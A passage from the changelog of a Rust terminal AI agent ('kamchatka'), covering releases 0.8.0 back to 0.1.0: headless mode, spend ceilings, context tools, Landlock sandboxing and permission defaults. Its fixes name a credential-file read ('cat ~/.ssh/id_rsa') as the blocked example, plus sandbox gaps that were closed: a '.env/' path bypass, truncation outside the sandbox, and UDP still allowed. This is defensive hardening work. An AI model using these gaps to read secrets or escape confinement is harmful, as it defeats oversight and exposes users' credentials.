  rather than something `expanded` reads, and the separator goes through `std::path::is_separator`.
  The old test read the same variable to find its expected answer, so it panicked before asserting
  on the one platform where the function was wrong.

## [0.8.0] - 2026-09-11

### added

- A spend ceiling: `Setup::spend`, `--spend TOKENS` and `/spend`. It adds up `input + output` per
  response and stops the session by the ordinary door - the turn in flight is interrupted, what
  arrived is kept, the session is written out. `--deadline` bounds time, which a model stuck in a
  loop will stay inside while spending the whole of it.

  It belongs to the session: `App::on_event` counts and `App::start_turn` refuses, so an embedder
  cannot get round it. In tokens, because a figure in money would be a price list. A stopping rule
  rather than a cap, since a response's cost is known only once it has arrived. `/spend N` raises
  the ceiling, `/spend 0` removes it, and an endpoint reporting no usage is said so once.
- `--config-file PATH`, a JSON file for the settings otherwise typed every time, each key named
  after its argument and all optional.

  The command line wins, including over a value that happens to equal the default - the merge asks
  clap which arguments were *typed*. A list on the command line replaces the file's rather than
  adding to it. `--model` reads command line, then `KAMCHATKA_MODEL`, then the file. An unknown key
  is an error naming the ones that exist. A leading `~` in the two sandbox lists is expanded, and
  that is the only place in this crate that expands one. It carries nothing belonging to an
  invocation - a message, `-r`, `-f`, `--headless` - and there is no search for a file.
- `kamchatka.json` ships beside the readme: every setting at its default. It grants nothing -
  `allow` empty, both sandbox lists empty, `on-ask: deny`. The one non-default value is a spend
  ceiling, which is a tightening. `Settings` serializes too, so the suite holds the shipped file to
  having a key for every field.
- `--headless`: the same program driven by lines instead of keys. A line of stdin is a message or a
  `/` command; the session log goes to stdout one JSON record per line and the model's words to
  stderr. Implied when stdout is not a terminal, and says so.

  Records come from `Kernel::history_since`, so they are the same bytes `/save` writes, including
  `session.started` and `session.finished`. `--allow`/`--deny` answer permissions in advance and
  `--on-ask` covers the rest, defaulting to **deny**.

  A line is read only while the kernel rests, so lines cannot overtake the turns they belong to; a
  question is answered only once the kernel rests; the model's words end their line before anything
  else writes one; and the session is ended by the loop rather than its caller.
- `headless::Headless`, that loop, over any `AsyncBufRead` and two `Write`s. `--deadline 300`
  interrupts what is in flight, records it, and leaves by the ordinary door; `ctrl+c` does the same
  once and leaves at once if pressed again. Both are the driver's rather than a `timeout` around it,
  since a dropped future never finishes the session. `Headless::stops_on_ctrl_c` is off by default.
- `wiring::Setup`: a session assembled, with a `Default`, and `wire(provider)` returning the `App`
  and two receivers. Two of its steps are not guessable: the subscription must happen *before*
  anything is plugged in, and `introspect::install` returns a handle the caller must keep. It does
  not reach the network or read the environment.
- `mcp::attach`, which was `main.rs`'s own. The part that is not obvious is the name: it prefixes
  the server's tools and is what `always, for mcp:<name>` grants.
- A `tui` feature, on by default, holding the screen and keys. The binary declares
  `required-features = ["tui"]`. `cargo tree -e normal` goes from 267 crates to 179 with MCP on.
  Three of the six test suites run without it.
- The headless suite drives the binary against a socket, which is what lets the rest be tested
  without a key. It closed: a second `ctrl+c` against a tool that will not stop (an MCP server that
  never answers - a kernel interrupt lands between steps, and a call in flight is not); the first
  press stopping a `shell` command; `--spend` through the command line; the session written when
  nobody said `--no-record`; and a screenless build at a terminal, under a pty.
- A live test that a PDF goes out as a document in Google's native dialect. The OpenAI-dialect test
  cannot be pointed there - the shim answers `400 Invalid content part type: file`. With it,
  `cargo test -p kamchatka --test live` passes in full against a single Google key.

### changed

- `App::submit` returns a `Reply`: what the line did (`Did::Asked`, `Did::Queued`, `Did::Ran`), the
  lines it said, and the page it opened. Breaking. The page had no other way out - it came back by
  `take()`ing the overlay, so a command that opened no page reported the last one that did.
- `App::submit` and `App::interrupt` are `pub`. Every verb is reachable only through `submit`, and
  while it was `pub(super)` the only way in from outside was to synthesize a key press.
- `ui::HELP` moves to a private `help` module with the selector listing; `thousands` and `charged`
  move to `app::text`. The public path `ui::HELP` is unchanged.
- The chat-against-the-request property drives a generated sequence of moves rather than six chosen
  ones, and carries its own reachability check over the nine-move alphabet. Drawing an archived item
  on the chat is caught by this and nothing else.
- `--sandbox-allow` and `--sandbox-read` take a comma-separated list, like `--allow` and `--deny`.
  Repetition still works and survives a path with a comma in it.
- The live test about a turn carrying its thinking asserts that *wherever* a summary appears it is
  carried in the turn, in order, and findable through `thinking()`. Measured 2026-09-11, a response
  that makes a call carries no thought summary at all.
- Requires `nachalnik` 0.5.0, whose `PermissionPolicy::why` takes a `PermissionRequest`. `Careful`
  keeps its own record of the last sixty-four refusals, because its second reader is the permissions
  tab, which asks by identifier off an event carrying no arguments.

### fixed

- Every early stop in a headless run left the process hung. `tokio::io::stdin` reads on a blocking
  thread, a blocking read on an open pipe does not return, and dropping a runtime waits for its
  blocking threads. Only reachable with stdin still open, which no piped test is. The runtime is let
  go with `shutdown_background` as the last statement.
- A build with no screen panicked when run in a terminal. Having no screen was a notice beside a
  decision never made: the mode was `--headless` or a piped stdout, and neither is true of somebody
  typing at a terminal. Every test of this binary pipes stdout.
- A refusal from the three file tools names every path the session reaches, and a write refused for
  a read-only path names where it may write instead. It named only the working directory, which
  stopped being true the moment anybody passed `--sandbox-allow` or `--sandbox-read`.
- A line said while an answer was still arriving reaches a headless reader. The driver marked its
  place in `App::loose` by length, and that list is not append-only - a recorded turn takes back
  every line that streamed out of it. The spend ceiling's own stopping line went missing this way.
- `/spend` counts whether or not a ceiling is set, so `/spend N` part way through a session does not
  start from zero.
- A resumed headless run says how it is driven, not only what it picked up.
- `Entry` derives `Debug`.
- A headless run exits non-zero when its *last* turn failed. A turn that failed and was carried on
  from is a session that recovered.
- A suite for `--mcp` with `--headless`. They meet at a question: MCP tools declare `mcp:<server>`
  and a headless run has nobody to ask, so every call is refused unless `--allow mcp:<server>` was
  given in advance - recorded before the server has been spawned or said what it offers. A real
  child process, skipping without a Python interpreter. What it pins about a dead server is that a
  call fails rather than hangs.

## [0.7.0] - 2026-09-10

### added

- `/attach PATH [TEXT]` puts a file in the context and asks about it in one act. Text goes in as
  text; a PDF, image or recording goes in as `Content::Blob`. It *is* `-f`, one function reached two
  ways, so `-f report.pdf` no longer fails with a decoding error.

  The extension decides, for the ten types in `attach::TYPES` - sniffing gets the interesting case
  wrong, since an uncompressed PDF is valid UTF-8 for pages at a time. A file that is neither a
  listed type nor valid text is refused rather than guessed at. The path travels with the payload as
  a text block, because `LinearProjector` labels a reference by prepending to its text. Not pinned,
  where `-f` is.
- The corner figure is anchored on what the provider charged: reported cost, plus what the context
  estimates now, less what the estimator says the items that figure covered would cost now. An item
  that has not moved cancels and contributes its measured cost, so only what changed is estimated.
  It absorbs per-message framing, the tool schemas, and any blob already sent. Falls back to the
  plain estimate before any response, on an endpoint reporting no usage, and after a model change.
- `App::drafted` counts a message being typed, and the status line adds it to the anchored figure. A
  slash command counts as nothing.
- `/budget` says which of the two figures the corner shows and what the anchored one is built from.
- The context pane marks a row the counter would not price as `0+` rather than `0`. "Measured, and
  free" and "nothing priced this picture" were the same cell.
- A `Content::Blob` item draws as `[image/png, 12.05kB]`. This program renders no pictures.
  `/request`, `/payload` and `/raw` name it rather than printing megabytes of base64 - by shape
  rather than by length, so a long tool result is not cut.

### changed

- The chat is derived from the context rather than accumulated beside it. `App::transcript` is gone;
  `App::conversation` reads the context every frame and `App::loose` holds only what that cannot
  account for - mid-stream fragments and chrome.

  Gone with it: `Entry::item`, `Entry::was`, `App::attribute`, `App::attribute_waiting`,
  `App::resay`, `App::edit_of`, `App::said`, `App::retell`, `App::last_turn`. All answered one
  question - which line goes with which item - that a derived conversation never asks. `App::replay`
  now says only what a resumed session picked up.
- The chat shows the conversation the model is in: an item that is not projected is not on it. This
  reverses a decision - the context tab is already the record of what happened, so the chat answers
  "what is going" and the tab answers "what happened". An elided item stays, marked, because it *is*
  in the request; so does a turn whose tool call has not been answered yet.
- An elided turn reads as the projector's own marker, taken out of the projection rather than
  assembled again.
- An edit reads where the turn it replaced was. `App::in_order` places an item that replaces another
  in the other's place; `commit_edit` records which on `meta`, so a resumed session draws it there
  too. An edit supersedes, so otherwise a correction to the first question read last.
- A turn rewritten in place reads as it is now - there is no copy of the words taken on arrival.
- The rewrite line is `~ [id] · rewritten here, N earlier version(s)`, drawn for any rewrite.
- The chat drops the lines naming what a tool call cost, what the output limit took, and the stub
  above a rewritten turn - each is a fact about an item and a column on the context tab.
  `{tool} reported an error` survives.
- `App::ask` says, pushes and attributes a message as one act. `--message` did the first two, so the
  opening line of every `-m` session was unreachable by any context change.
- A reference's chat line names what the item carries and what nobody could price, derived off the
  item - which is why `/attach` says nothing for itself.
- `-f` takes any file through `attach::attached`, not only a text one.
- `Trim` takes a tool result carrying a blob first, and the size arithmetic gets no say about one.
  Every counter puts a blob at `0` tokens, and the pass runs on two rules that both read that
  figure. Size decides nothing in either direction: an eight-pixel PNG is a hundred bytes and 255
  tokens at a vendor charging 85 plus 170 a tile.
- `Trim::should_compact` answers yes to anything in the request the counter would not price. Without
  it a context that is mostly pictures never reached the threshold. `plan` still answers `None` when
  there is nothing it may take.
- The pass's summary names the blobs it took.
- `/budget` says how many pieces of content the counter would not price, and names the counter.
- `provider::connect` and `provider::gemini::connect` read `KAMCHATKA_API_KEY`,
  `KAMCHATKA_BASE_URL`, `KAMCHATKA_CONTEXT_LIMIT` and `KAMCHATKA_NO_ATTRIBUTION` and pass them in.
  The providers read no environment at all now. Nothing changes for anyone running the program.
- Two fewer direct dependencies: `reqwest` and `rustls` belong to the providers.

### fixed

- Past the limit the corner says `· the compactor runs first`. A pass runs when a request is
  *built*, so a tool loop left the corner at 270% in red while the request that followed cost 1,100.
  With no compactor it claims nothing.
- A file put in the context is announced once. The derived line is the one that cannot go stale.
- `/budget` no longer puts a Rust type path in the middle of a sentence.
- The compactor no longer fills the context it is clearing. Every pass wrote a summary and nothing
  took one back out, since a summary is a `Reference` and the pass only considers tool results - at
  a 6,000-token limit, twenty-one identical summaries and a quarter of the budget. Each pass now
  supersedes the last one's.
- A call waiting on a decision is not drawn as something the model is not being shown. The projector
  leaves a turn out while one of its calls has no result, so the chat drew "an assistant turn with
  no content and no answered calls" above the very call being authorised.
- `/model` and `/provider` drop the anchor. `App::anchored` documented that fallback and nothing
  implemented it.
- The corner figure cannot fall to `~0` and stay there. `Anchor` subtracted the whole of what each
  item *holds* from the provider's figure, so an elided item contributing one line had twelve
  thousand tokens taken off. It records which items' content was in the request and what the markers
  came to, separately.

### removed

- `kamchatka::provider::OpenAiCompatible`, `kamchatka::gemini::Gemini`, `provider::Endpoint`,
  `provider::same_model`, `provider::NOT_A_STREAM` and the `gemini` module. Both providers are now
  [`nachalnik-providers`](https://crates.io/crates/nachalnik-providers); nothing they do has
  changed. They moved because nobody else could use them - the runtime ships no provider by design,
  and the only two complete implementations were locked inside a terminal program.

## [0.6.1] - 2026-09-09

### added

- `/params` warns when a parameter would make the answer unreadable. Inception's `diffusing` sends
  the whole answer again at each denoising step, so a 120-character answer arrived as 1,443
  characters of drafts. A warning and not a refusal: parameters go to the provider verbatim.

### fixed

- What a turn cost to generate is on the screen, with the reasoning as a share of it:
  `1,412 out, 1,139 of it reasoning`, through one renderer in all four places. A model charged for
  reasoning it does not send back is said so once.
- The Gemini dialect's `output_tokens` includes the thinking. `candidatesTokenCount` alone
  understated a thinking-heavy turn fifty to one.
- A model listing is read under either name the dialects publish: `supported_parameters` and
  `supported_sampling_parameters`. The narrower name lists sampling knobs only, so
  `Endpoint::lists_every_parameter` says which kind of list is behind an answer and `/params` words
  an incomplete one as a note rather than an error.
- Thinking sent as a finished summary is read: `{"content": ..., "status": "complete"}` on the chunk
  rather than in the delta. More than one arrives per turn, each covering the reasoning since the
  last, so they are appended. A streamed request needs `reasoning_summary_wait: true` beside
  `reasoning_summary: true`, or the stream ends before any summary exists.
- A refused request is reported by the sentence inside it, including when `error.message` is a list
  rather than a string. Where the wording names nothing, `loc` is prepended.
- One failure is one red line. The guard was on the event and not on the outcome wrapping it.

## [0.6.0] - 2026-09-08

### added

- `/limit`, which is how much of each tool's output the model is shown, and now changeable.
  `/limit read 64000` moves one from that tool's next call onward; `Tool::spec` is called afresh for
  every request, so it lands without a restart. The limits live in one shared `Limits` table. Rows
  are numbered and the number is one the command takes. The already-shortened call is recovered a
  different way: its whole is archived beside the copy the model saw.
- The conversation marks which of itself the model is still being shown. An excluded, archived,
  elided or superseded turn keeps its place and words, with a rule down its left and a line naming
  the item and why it is out. Marked rather than hidden. The reading asks the projection, not the
  item's state. `app::Entry` grew public `item` and `was`.

### changed

- A session is named for when it started, in UTC, and that name is its two files:
  `/tmp/kamchatka/2026-09-08T06-45-17Z.jsonl`. `App::session_stamp` does the calendar in Howard
  Hinnant's `civil_from_days` - no dependency for a filename. Still to the second, so two sessions
  inside one second collide as before.
- A permission question stands in the prompt's place on the chat tab rather than as a modal overlay,
  and the prompt is on the chat tab only. Being asked whether `amend` may elide item 22 used to mean
  deciding with the box covering the list saying what item 22 is.

  The settling window is gone with it: a question used to take every key on arrival with a 300ms
  timer deciding which, and one session granted `shell` for the rest of it with the `a` of "what".
  `tab` is what gives a question the keys now. It takes the prompt's rows rather than sitting above
  them, so a short window cannot leave the prompt holding the keys off-screen. What was typed is not
  lost - the prompt is not drawn rather than cleared.

  `App::locked_key` is the guard: until `tab`, only the keys that scroll the conversation do
  anything. The panel carries `[tab] puts the keys here, and then:` rather than promising a key it
  has not got.

  This removes public API: `app::SETTLING`, `App::open` and `Overlay::Permission` are gone, replaced
  by `App::asked`, `App::prompted` and `App::question_scroll`.
- The permissions tab names the policy and what it answers about everything not listed:
  `Careful · anything it has not been told about: ask`. Both halves come from the policy -
  `Careful::untold` is what `Careful::stance` falls back to. With nothing decided, the tab says the
  emptiness is not permission.
- An item's `as stored` page opens with `included_because` where there is one.
- `/budget` says how much of the last request the provider served from cache. It prices a *change*
  rather than a request: the front of a request is the tool definitions and oldest messages, so
  anything rewriting them is paid for in full next time.
- `amend`'s `note` says what it is for. Thinking belongs to the turn that produced it, has no
  identifier, is not reliably carried back, and is not a row on the context tab. A note is an item:
  numbered, projected into every request, pinnable, visible.
- A fork leads with the answer and puts the thinking after it, since an output limit cuts from the
  end. On one 34,287-byte fork the thinking was 68% and sat last.
- An edit reads where the turn was, with the row above saying what happened. Saying the new text
  instead is wrong: `say` appends, so an old edit lands after everything that followed it.

### fixed

- Nothing this crate's test suites write goes in `/tmp`. Each cleared its directory on the way in
  rather than out and the name carried the process id, so thirty runs left 810 directories.
  `tests/common::scratch` hands out one under `CARGO_TARGET_TMPDIR`. One path stays in the temp
  directory, because the claim it checks is that the temp directory is *not* opened up.
- Two sandbox tests stopped leaving a confined command's scratch directory behind: they called
  `output()`, which consumes the child, then removed a directory named for the *test's* own id.
- A repair the request needs every time is said once rather than after every message, in the present
  tense, and the count is the whole of it. The trace keeps every one.
- The chat tab's border lights like the other three. It went yellow when the keys were on the tab's
  body, which on the chat tab they never are. The prompt now answers "where does what I type go?" in
  the same yellow the pinned question uses.
- An undone edit comes off the conversation with the item it named. It is a reading now rather than
  a copy: `Entry::text` keeps what was said and `App::said` asks the item what it says now.
- `cargo doc` builds again - four intra-doc links named private methods from public documentation.
- `Trim` does not ask for a pinned result. `ContextState::sends_content` says yes to one, so the
  filter took it and the kernel refused - and the plan still carried a summary, so three turns
  produced three summaries saying a result had been elided when none had, three undos spent, and the
  request climbing 2,637 → 2,716 → 2,788.
- `/budget` drops the percentage from its account of what the counter learned. It was computed from
  `scale - 1`, the error as a fraction of the guess, while the sentence reads as a fraction of the
  truth - 54.3% against 35.2%.
- `amend`'s list of moves no longer implies an excluded item is still charged for. Measured,
  `archive` and `exclude` produce the same request to the token.
- `Trim` credits itself with the net of each elision and skips a result no bigger than its marker.
  Each elision buys back the content less one copy of the pass's reason, about 21 tokens - so twenty
  seven-token confirmations "recovered" 140 tokens and took the request from 852 to 1,190, through
  the limit the pass exists to hold.
- A stream that stops arriving keeps what arrived, rather than failing the turn and dropping tokens
  already billed for. Retrying is worse: every attempt is billed. Both dialects, via the shared
  conformance suite.
- A row the projector repaired away says what it is holding. Whether an item is going cannot be read
  off its *state* - an item repaired away is `Active`, holding everything, and not in the request.
  `App::costs` became `App::going`, and `Going::sends_content` is what every column, reason, filter
  and figure asks. One projection per frame.
- One word per mechanism, in `amend` and at the prompt. The `prune` action with a `state` argument
  put one move's word over five, so "prune to pin it" was the documented way to protect something.
  The five moves are actions now, each named for the state it leaves behind; `/prune` becomes
  `/exclude` and `/keep` becomes `/pin`. The old spellings are still accepted and undocumented.
- The question about an `amend` names each item the way the context tab does, and expands a `select`
  into what it matches. Only for the two tools this program installs itself.
- A leading `~` is refused in words rather than becoming a directory called `~`. Not expanding is
  the right default and is kept; the three file tools share one `PATH_ARG` describing the rule, at
  87 tokens across the definitions.
- The `~` refusal says the same path will be refused again as it stands, and names no other concrete
  path - every concrete path in a refusal is read as a path to try. The literal-`~` spelling moved
  into `PATH_ARG`.
- `amend` accounts for a change with the reason for *that* change, so a note is not told its extra
  tokens are the marker of an elision it did not perform.
- A move given a `label` instead of `ids` is told the spelling: `select: "label:secrets.txt"`.
- The status line's give-way ladder gained the rung it was missing: after the address, the vendor
  prefix goes, then the name is cut from the left.
- A provider's notice reaches whoever holds the `App`, via `on_outcome`, so it sits with its turn.
- A compaction pass counts elisions, not only removals. The compactor here only ever elides, so
  every pass announced itself as `compacted: 0 items out`.
- Blank lines a provider puts in front of a message are not drawn. The item keeps what arrived.
  Cosmetic in the conversation and not in a tool result, whose preview is the first six *lines*.

## [0.5.0] - 2026-09-06

### added

- <kbd>ctrl+home</kbd> and <kbd>ctrl+end</kbd> go to the beginning and end of the conversation.
  Control is held because <kbd>home</kbd> and <kbd>end</kbd> belong to the prompt.
- `--sandbox-read PATH` opens a path for reading only, beside `--sandbox-allow`, which opens one for
  reading and writing. A confined `cargo build` fails on `~/.rustup/settings.toml` in a way that
  looks like a missing compiler; `--sandbox-allow ~/.rustup` would have fixed it and handed the
  model the ability to replace the toolchain.
- A refused confined command names the path outside its reach and what it can reach instead, under
  the status line where an output limit cannot take it. Landlock refuses with `EACCES`, which is
  also what the kernel says about somebody else's file. A refusal naming only reachable paths gets
  nothing.

### changed

- `sandbox::confine` takes `Option<&Path>` for the scratch directory and `sandbox::make_scratch`
  makes one, so "there is no scratch" is sayable rather than inferred.
- `network: deny` is described as refusing TCP, which is what Landlock's two network rights cover. A
  confined command can still send a UDP datagram. Nothing about the confinement changed.
- `--requests 0` says in `--help` that it means no limit.

### fixed

- The budget no longer charges for thinking this dialect cannot send. `send_reasoning` is on by
  default but `to_wire` has never put it on the wire and cannot. One turn with 3.4KB of thinking was
  charged 928 tokens against a request carrying 73. `Calibrating` cannot correct it, since the wedge
  grows with the number of reasoning turns while the scale is a single cumulative multiplier. The
  projection is `Endpoint::projection` now, rather than a second decision made in `main.rs`.
- `/load` puts every token figure on one scale, going through `Kernel::recalibrate` before counting.
  It counted first and corrected afterwards, so a context that came to 3,998 tokens read 2,002.
- `/budget`'s two halves answer the same question. The figure came from `tokens_withheld`, which
  counts an elided item, and the count beside it from what is not projected, which does not - so it
  read `held back: 9,004 tokens in 0 items`.
- `Trim` looks at what an item is *sending*. Its candidates were the projected tool results, and an
  elided item is projected as a marker - so every already-elided item came back as a candidate, the
  plan was never empty, and a summary went in before every request.
- `/load` hands over the tool call identifiers the snapshot already used; it dropped `used_calls` on
  the floor. The runtime grew `Kernel::reserve_calls` for it.
- The `shell` tool's temporary directory is created exclusively at `0700`. It has to be predictable,
  and `create_dir_all` was satisfied by anything already there, including a symlink left by another
  account.
- `introspect` declares the `whole` argument it reads. Three places told the model to use it while
  the schema did not declare it.
- The policy's two per-call notes drop the oldest past thirty-two rather than all of them.
- `amend`'s `note` does not spend two of the person's undos to write one thing down.
- A long answer keeps its beginning. The transcript bounded a still-arriving entry at eight thousand
  bytes and replaced what came before with `[...]`, and nothing put it back. The bound is on a
  tool's output and nothing else.
- Git survives a configuration it cannot read. Under Landlock `access(2)` answers from the file's
  own permissions, so git was told `~/.gitconfig` was readable, got `EACCES` opening it, and took
  the *unreadable configuration* branch - exit 128 for every git command in a confined session. Such
  a command is now handed `GIT_CONFIG_GLOBAL` pointing at nothing.
- A multi-byte character split across two reads is no longer destroyed. Both providers decoded each
  chunk lossily as it arrived, so `zażółć` came back `za??ółć` and went into the context, the
  transcript and the log. The buffer holds bytes and only whole lines are decoded.
- A confined command cannot truncate a file outside the working directory. The ruleset was built on
  ABI 1, and a right a ruleset does not *handle* is not restricted at all; truncation has had its
  own right since ABI 3, because `truncate(2)` takes a path and never opens the file. The ruleset
  asks for ABI 3, which brings `Refer`.
- A credential rule matches the resolved path rather than the raw argument split on `/`, so a `path`
  of `.env/` no longer opens `.env` unmatched.
- The pattern matcher backtracks - it took the first `find` hit, so `a*bc` refused `abcbc`.
- The session written on the way out goes into a `0700` directory.

## [0.4.0] - 2026-09-05

### added

- Every session is written out when it ends, to a temporary directory, with the path printed last.
  `--no-record` turns it off. The old condition was backwards: a session that ended badly is the one
  worth reading and the one that left nothing.
- `/params` shows what else the model takes and names any set parameter it does not. An unaccepted
  parameter is sent, ignored, and nothing says so, so a `seed` set for a reproducible run buys
  nothing and looks like it worked. Read from the listing the context limit already comes from.
- A `prune` that hides items while the agent has written nothing down says so, and names `note`. A
  run elided seventeen tool results in one call and then answered ten questions from a context
  holding none of it - wrong on every one, inventing a crate and seven enum variants.
- `look` returns a long item as its start and its end; `whole: true` asks for all of it. Reading an
  item copies it into the context, so a model inspecting a 9,000-token result to decide whether to
  keep it pays nearly what keeping it costs.
- Hiding an item says how to get it back, and names `undo`.
- `state` accepts any spelling for putting something back - `unelide`, `unexclude`, `unarchive`,
  `unpin`, `include`, `active` - deliberately left out of the schema's `enum`.
- The error for an unrecognised `state` says what each one does, not only what it is called.
- A prune that made the request *bigger* says so. An elided item's marker carries the reason for
  eliding it, which on a short item costs more than the content did.
- The requests say which program made them, where the endpoint ranks programs. This crate's
  directory and the word `kamchatka`, sent only to OpenRouter, matched on the authority so
  `openrouter.ai.example.com` is not it. `KAMCHATKA_NO_ATTRIBUTION` turns it off.
- <kbd>f</kbd> on the context tab lists only what the next request carries: it hides every row with
  a figure in the `held` column. Nothing is changed and nothing is logged. Asking for a hidden item
  by number says it is hidden rather than absent.
- `--forget-truncated` drops a tool's whole output once shortened rather than archiving it. The cost
  is in the file: one `grep` into `./target` put 11MB of build noise into every save. Keeping it is
  still the default.

### fixed

- A request that stalls is waited out, like a busy server. A connection that timed out used to take
  the session with it - eleven of fourteen runs against one upstream died that way while the same
  model answered a single request in six seconds. A refused connection is deliberately not retried.
- A request not yet answered is watched like a stream: `esc` stops it, silence is reported at ten
  seconds and then at intervals, and it gives up after 150. Only the stream was watched, so all of
  that began at the first byte; the longest measured case held the terminal for eighteen minutes.
  Google's dialect gets it too.
- Both readmes said the sandbox reaches further than it does. The system paths are readable on
  purpose, because a command that cannot read `/usr/bin` cannot be a command. Both now give the two
  commands that show the line: `cat /etc/passwd` works, `cat ~/.ssh/id_rsa` does not. The file tools
  refuse `/etc/passwd` by their own code and always did.
- A tool call numbered from one no longer leaves a phantom call at zero. The streamed `index` says
  which call a fragment belongs to and is not a position in a list; it is looked up now, so any base
  works and so does a provider that skips a number.
- An error arriving *mid-stream* is read too - it sends the object on its own with `message` at the
  top, where a refused request nests it under `error`.
- A refused request reports the server's sentence rather than its whole envelope. A spent daily
  quota came back as six hundred characters of JSON including the account's `user_id`, into the
  session log, which is a file people send each other.
- `Retry-After` is honoured where the server sends one, and past a minute this stops rather than
  sitting through four doublings. A per-minute limit answers `5`; a spent daily quota answers with
  the seconds until midnight.
- `amend` points a state-named action at the argument it belongs to, so a word it knows anywhere
  comes back with the call that would have worked.
- A figure too wide for its column no longer takes the columns from its neighbour. The `held` column
  is the one where an unbounded number can turn up; it is abbreviated when it will not fit.

## [0.3.0] - 2026-09-01

### added

- `Careful` hands its reason for a refusal to the model as well as the screen, through
  `PermissionPolicy::why`. The model used to read `the call was not permitted`, from which a
  standing `deny` and a one-off `n` are indistinguishable.
- A working marker: three dots under `asking` or `running`, joined after five seconds by elapsed
  time. Which dot is lit comes from the clock, so it stops where it is if the screen stops drawing.
- `/load [PATH]`, the other half of `/save`, as a context operation rather than a restart. Nothing
  is destroyed: the current context is archived, pinned items stay, the saved items arrive as new
  items with their parameters and calibration, and `u` twice puts it back. Refused while a turn is
  running or a call is waiting.
- <kbd>enter</kbd> on a context item opens a paged box moved between with `←` and `→`. `to the
  model` is what the item puts into the next request, read out of the projection of the whole
  context; `as stored` is what the item holds. It opens on the first.
- `v1`, `v2`, … pages: what an item said before it was rewritten, newest first, up to eight deep.
  `amend revise` replaces in place, so the old text exists nowhere but `context.replaced`. No
  runtime change.

### changed

- **Breaking, for the library:** `Overlay::Permission` is a struct variant carrying its own
  `scroll`, and `Overlay::Text` holds `pages` and `page` where it held one `body`.
- The trace says what its events carry. A third printed a dotted name against an empty line,
  including `context.replaced`. A test refuses a name with nothing beside it.
- The trace gains a gap column, blank under a tenth of a second. A log with no clock cannot answer
  which step was slow, and timestamps would make somebody subtract.
- The context pane has two token columns: `sending`, read out of the projection, and `held`. One
  column reported what an item held under a heading saying what it cost.
- The label column is as wide as the widest label rather than a fixed twenty-six.
- One word per mechanism: an output limit **truncates** and a compactor **elides**. Both were called
  "shortened", in the same pane on adjacent rows.
- The tool definitions are written for the thing that reads them - every argument says what it is
  for. `shell` says it is confined **when it is**, because a command stopped by Landlock returns an
  ordinary permission error and a model that cannot tell those apart tries `sudo`.
- Nothing a model reads is written in this program's own vocabulary - no `at the terminal`, which
  reads to a model like a state it should recognise.
- A path outside the sandbox tells the model what it can do instead, rather than suggesting a
  restart with `--sandbox-allow`.

### fixed

- A stopped `shell` command keeps the line saying so: it is on the exit line, first in the result,
  where an output limit cutting from the end cannot take it.
- A markdown table wider than the window is drawn rather than wrapped as prose: columns give widest
  first down to a floor, cells wrap with their styling, and the delimiter row's colons decide
  alignment.
- The greeting is `ui::GREETING`, with a test that the keys it names do what it says. Both halves of
  the old one were wrong.
- `ctrl+p` in an empty session says there is nothing in the context yet and what puts something
  there, rather than the runtime's sentence for a rule it is enforcing correctly. When the context
  is not empty and still sends nothing, the list of what was left out goes above the answer - it
  used to be thrown away, because the error returned before the list was built.
- A stalled request says so: silence for ten seconds is reported, again every thirty, and given up
  on at a hundred and fifty. The heartbeat only made a silent stream interruptible.
- The retry budget for a busy server belongs to the request rather than the session.
- The conversation stays where it is scrolled to. Every streamed fragment used to set the window
  back to following the newest line. `ctrl+e` follows again.
- A permission question whose arguments are longer than the screen keeps its answers. It is three
  regions now, with the arguments scrolling between the header and the answers. Both overlays
  remember how far they really scrolled rather than how many times a key was pressed.

## [0.2.0] - 2026-08-30

A second wire format, in which a turn keeps its order, and two tools an agent reads and manages its
own context with.

### added

- `--gemini` talks to Google's own API. `generateContent` answers with `content.parts[]` in the
  order they were produced, where the compatible shim flattens that into a `content` string beside a
  `tool_calls` array. Recorded as `Content::Blocks` and sent back the same way, with
  `LinearProjector::send_blocks` on.

  Signatures are the reason to bother: this API answers `400 Function call is missing a
  thought_signature` to a turn returned without one, and it signs text parts as well as calls.
  `finishReason` does not decide the stop reason - it says `STOP` for a turn that asked for three
  tools.
- `provider::Endpoint`, the half of a provider the person at the terminal drives: where the requests
  go, what is served, which model, what the last retry was about. `App` holds an `Arc<dyn Endpoint>`
  and never learns which wire format is behind it.
- `introspect` and `amend` read an ordered turn. The guard stopping `amend` excising the turn it is
  speaking in finds that turn by its calls wherever they are recorded.
- `--introspect`, and `/introspect` while running, offer two tools for reading and managing the
  model's own context. Off by default.

  `introspect` reads. `look` lists every item with its state, cost and the projector's reason for
  leaving it out, and reads any in full. `budget` is what a decision about what to give up is made
  from: the next request against the limit, split into context and tool definitions, what the last
  one really cost, the correction learned from the difference, and the most expensive items
  *actually* going in. `request` summarizes rather than quotes - the request *is* the context, so
  quoting would double every token being asked about. `draft` and `fork` snapshot the context,
  resume it as a second kernel with no tools and one request, and return only what it said. A fork
  can think and cannot act.

  `amend` manages. `prune` moves items between states, by `ids` or `select`. `revise` rewrites an
  item, recording the old text as `context.replaced`. `note` writes into the context, attributed to
  `agent`, pinnable. `undo` and `redo` walk this tool's own changes - deliberately not
  `Kernel::undo`, whose stack belongs to the person and whose top while a tool runs is the assistant
  turn that asked for the call. A reason is required on every change. A pinned item, a system
  instruction and the turn the model is speaking in are refused.

  Two tools rather than one with a mode argument: a `ToolSpec` declares its capabilities once, so
  one tool would make "may it read its own context?" and "may it rewrite a tool result?" the same
  question. They hold a weak handle to the `App`'s kernel, so `/introspect` taking them away really
  takes their reach away.

## [0.1.0] - 2026-08-29

The first release: a terminal agent built on `nachalnik`, and a demonstration of it.

### added

- Four tabs, each taking the whole window: `chat`, `context`, `trace`, `permissions`. `ctrl+t` for
  the next, `alt+1`–`alt+4` for one in particular, `tab` between the prompt and the open tab. A
  message sent into a running turn waits, says so, then gets a turn of its own. The prompt wraps at
  word bounds and grows to hold every row; a pasted block arrives as the lines it was pasted as, via
  bracketed paste. A scrollbar runs down the right border rather than in a column of its own.
- The context tab is a table: every item, its kind, cost, whether it is going into the next request,
  and what the model will read of it - or why not, in the projector's words. `space` cycles how much
  the model gets, `p` pins, `enter` reads the whole, `u` undoes, `23G` goes to item 23. The middle
  step is the one worth a key: taking a tool result out makes the projector drop the call that asked
  for it, and eliding leaves the call answered.
- `e` on a context item changes what it says, through `Kernel::supersede`.
- The trace tab is every event as it happens, in the session log's own names, two aligned columns,
  wrapped rather than cut off.
- A `permissions` tab: every capability the policy has an opinion about *and* every capability a
  registered tool declares, what the policy will answer, and which tools that covers. `space` cycles
  a row; `a`/`n`/`r` set one directly. The permission prompt writes to the same table. Cycling back
  to `ask` takes a row off the tab.
- **Every stance starts at `ask`**, `read` and `network` included. Both `read: allow` and
